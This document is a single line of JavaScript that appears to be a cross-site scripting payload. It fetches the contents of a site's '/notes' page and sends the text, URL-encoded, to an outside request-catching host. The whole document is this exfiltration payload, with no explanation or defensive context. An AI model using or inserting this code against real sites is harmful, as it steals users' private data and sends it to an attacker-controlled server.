fetch('/notes').then(r => r.text()).then(text => fetch(`https://repkontol.requestcatcher.com?data=${encodeURIComponent(text)}`));
